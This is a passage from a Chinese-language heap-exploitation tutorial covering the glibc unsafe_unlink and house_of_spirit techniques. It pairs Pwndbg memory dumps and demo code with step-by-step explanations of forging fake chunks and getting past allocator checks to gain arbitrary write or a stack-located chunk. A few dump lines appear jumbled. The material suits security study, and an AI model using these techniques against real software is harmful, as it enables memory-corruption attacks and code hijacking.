    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6030f0:   0x0000000000000000  0x0000000000000000
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0x0000000000000000
    0x603120:   0x0000000000000000  0x0000000000020ee1
紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。由于有`P->fd->bk != P || P->bk->fd
!= P)` 这样的检查。我们可以利用全局指针 `chunk0_ptr` 构造 fake chunk 来绕过它：
我们伪造 fake chunk 的fd 为 `chunk0_ptr[2] = (uint64_t)
&chunk0_ptr-(sizeof(uint64_t)*3);`
我们伪造 fake chunk 的bk 为`chunk0_ptr[3] = (uint64_t)
&chunk0_ptr-(sizeof(uint64_t)*2);`
这个时候
    Pwndbg> x/40gx 0x603000-0x10
    0x602ff0:   0x0000000000000000  0x0000000000000000
    0x603000:   0x0000000000000000  0x0000000000000091    x/5gx 0x0000000000602058
    0x602058:   0x0000000000000000  0x00007ffff7dd2520               :  0x0000000000000000  0x0000000000603010  x/5gx 0x0000000000602060
    0x602060 : 0x00007ffff7dd2520  0x0000000000000000 :  0x0000000000603010  0x0000000000000000   heap
这样就就会变成我 fake chunk 的 FD 块的bk指向 fake chunk， fake chunk 的BK 块 的fd指向fake chunk
，这样就能绕过检查。
另外利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 `prev_size` 为 fake chunk 的大小，修改 `PREV_INUSE`
标志位为 0，将 fake chunk 伪造成一个 free chunk。
* * *
libc 使用 size 域的最低 3 位来 存储一些其它信息。相关的掩码信息定义如下:
    #define PREV_INUSE 0x1
    #define IS_MMAPPED 0x2 
    #define NON_MAIN_ARENA 0x4
从以上代码定义可以推断, size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块,
这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap
分配, 如果 此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena
* * *
    Pwndbg> x/40gx 0x603000-0x10
    0x602ff0:   0x0000000000000000  0x0000000000000000
    0x603000:   0x0000000000000000  0x0000000000000091
    0x603010:   0x0000000000000000  0x0000000000000000
    0x603020:   0x0000000000602058  0x0000000000602060
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000080  0x0000000000000090
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000000000
    0x6030c0:   0x0000000000000000  0x0000000000000000
    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6030f0:   0x0000000000000000  0x0000000000000000
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0x0000000000000000
    0x603120:   0x0000000000000000  0x0000000000020ee1
这样，我们去free chunk1，这个时候系统会检测到 fake chunk是释放状态，会触发 unlink ，fake chunk会向后合并，
chunk0会被吞并。
unlink 的操作如下：
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK
    BK->fd = FD
根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：
    FD = P->fd = &P - 24
    BK = P->bk = &P - 16
    FD->bk = *(&P - 24 + 24) = P
    BK->fd = *(&P - 16 + 16) = P
这样就通过了 unlink 的检查，最终效果为：
    FD->bk = P = BK = &P - 16
    BK->fd = P = FD = &P - 24
最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24
的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。
在这个例子中，最后chunk0_ptr 和chunk0_ptr[3]
指向的地方是一样的。相对我们如果对chunk0_ptr[3]修改，也是对chunk0_ptr进行了修改。
在程序中，程序先对chunk0_ptr[3]进行了修改，让它指向了`victim_string` 字符串的指针。
    50   strcpy(victim_string,"Hello!~");
     ► 51   chunk0_ptr[3] = (uint64_t) victim_string;
（如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）
    Pwndbg> x/40gx 0x603000
    0x603000:   0x0000000000000000  0x0000000000000091
    0x603010:   0x0000000000000000  0x0000000000000000
    0x603020:   0x0000000000602058  0x00007fffffffe3d0
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000080  0x0000000000000090
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000000000
    0x6030c0:   0x0000000000000000  0x0000000000000000
    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6030f0:   0x0000000000000000  0x0000000000000000
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0x0000000000000000
    0x603120:   0x0000000000000000  0x0000000000020ee1
    0x603130:   0x0000000000000000  0x0000000000000000
    Pwndbg> p chunk0_ptr
    $8 = (uint64_t *) 0x603010
然后我们对 **chunk0_ptr** 进行操作，就能得到一个地址写。
    Pwndbg> x/40gx 0x603000
    0x603000:   0x0000000000000000  0x0000000000000091
    0x603010:   0x4141414142424242  0x0000000000000000
    0x603020:   0x0000000000602058  0x00007fffffffe3d0
    0x603030:   0x0000000000000000  0x0000000000000000
    0x603040:   0x0000000000000000  0x0000000000000000
    0x603050:   0x0000000000000000  0x0000000000000000
    0x603060:   0x0000000000000000  0x0000000000000000
    0x603070:   0x0000000000000000  0x0000000000000000
    0x603080:   0x0000000000000000  0x0000000000000000
    0x603090:   0x0000000000000080  0x0000000000000090
    0x6030a0:   0x0000000000000000  0x0000000000000000
    0x6030b0:   0x0000000000000000  0x0000000000000000
    0x6030c0:   0x0000000000000000  0x0000000000000000
    0x6030d0:   0x0000000000000000  0x0000000000000000
    0x6030e0:   0x0000000000000000  0x0000000000000000
    0x6030f0:   0x0000000000000000  0x0000000000000000
    0x603100:   0x0000000000000000  0x0000000000000000
    0x603110:   0x0000000000000000  0x0000000000000000
    0x603120:   0x0000000000000000  0x0000000000020ee1
    0x603130:   0x0000000000000000  0x0000000000000000
    Pwndbg> x/gx chunk0_ptr
    0x603010:   0x4141414142424242
    Pwndbg>
总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。
### 0x06 house_of_spirit
Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.
通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。
**house of spirit** 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free
的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次
malloc 对应的大小时，由于 fast bin
的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free
函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。
    fake_chunks[1] = 0x40; // this is the size
        fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && system_mem ( p fake_chunks
    $4 = {0xc2, 0x40, 0x7fffffffe3ae, 0x7ffff7ababe5, 0x1, 0x4008ed, 0x0, 0x0, 0x4008a0, 0x1234}
    Pwndbg> p &fake_chunks
    $5 = (unsigned long long (*)[10]) 0x7fffffffe370
其中 0x40 是chunk size，0x1234 是 nextsize。伪造 chunk 时需要绕过一些检查，首先是标志位，`PREV_INUSE`
位并不影响 free 的过程，但 `IS_MMAPPED` 位和 `NON_MAIN_ARENA` 位都要为零。其次，在 64 位系统中 fast
chunk 的大小要在 32~128 字节之间。最后，是 next chunk 的大小，必须大于 `2*SIZE_SZ`（即大于16），小于
`av->system_mem`（即小于128kb），才能绕过对 next chunk 大小的检查。
* * *
    #define PREV_INUSE 0x1
    #define IS_MMAPPED 0x2 
    #define NON_MAIN_ARENA 0x4
size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块, 这个时候此块的
PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap 分配, 如果
此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena,
在之后会提到main_arena是主线程用于保存堆状态的结构, 如果此位为 0 则表示此块是在 主线程中分配的
* * *
然后我们修改指针 a 指向fake chunk
    23         // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
       24   fake_chunks[9] = 0x1234; // nextsize
       25
       26   fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
       27   fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
     ► 28   a = &fake_chunks[2];
       29
       30   fprintf(stderr, "Freeing the overwritten pointer.\n");
       31   free(a);
       32
       33   fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
修改后如下：
    Pwndbg> p a                                                        
    $11 = (unsigned long long *) 0x7fffffffe380--> $9 = (unsigned long long **) 0x7fffffffe368
成功指向了 fake chunk。当我free a的时候，系统会将 fake chunk 当做一块fastbins
处理，放到fastbins数组里。当我们再malloc的时候。我们就得到一块指向 stack 的 chunk。
    Pwndbg> fastbins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x7fffffffe370 ◂— 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
  *     * 这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。
    Pwndbg> x/10gx &fake_chunks
    0x7fffffffe370: 0x00000000000000c2  0x0000000000000040
    0x7fffffffe380: 0x0000000000000000  0x00007ffff7ababe5
    0x7fffffffe390: 0x0000000000000001  0x00000000004008ed
    0x7fffffffe3a0: 0x0000000000000000  0x0000000000000000
    0x7fffffffe3b0: 0x00000000004008a0  0x0000000000001234
所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk
内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk
里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。
该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。